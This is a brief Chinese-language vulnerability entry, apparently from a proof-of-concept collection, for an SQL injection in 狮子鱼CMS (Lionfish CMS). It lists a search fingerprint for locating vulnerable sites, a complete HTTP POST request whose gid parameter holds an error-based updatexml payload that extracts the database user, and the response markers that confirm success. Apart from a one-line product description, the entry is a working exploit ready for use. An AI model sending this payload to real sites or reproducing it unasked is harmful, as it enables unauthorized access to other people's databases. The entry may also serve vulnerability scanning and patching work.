﻿# 狮子鱼CMS SQL注入漏洞3

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：狮子鱼CMS（Content Management System）是一种网站管理系统，旨在帮助用户更轻松地创建和管理网站。它具有用户友好的界面和丰富的功能，包括页面管理、博客、新闻、产品展示等。

> 漏洞特征：body="/seller.php?s=/Public/login"

> 验证脚本：HTTP

```
POST /index.php?s=/Scekill/load_gps_goodslist HTTP/1.1
Content-Type: application/x-www-form-urlencoded

gid=1229) or updatexml(1,concat(0x7e,user(),0x7e),1)#
```

> 响应代码特征：404

> 响应内容特征：SQLSTATE

> 上传文件定位：


> 验证文件来源：狮子鱼CMS SQL注入漏洞3.poc
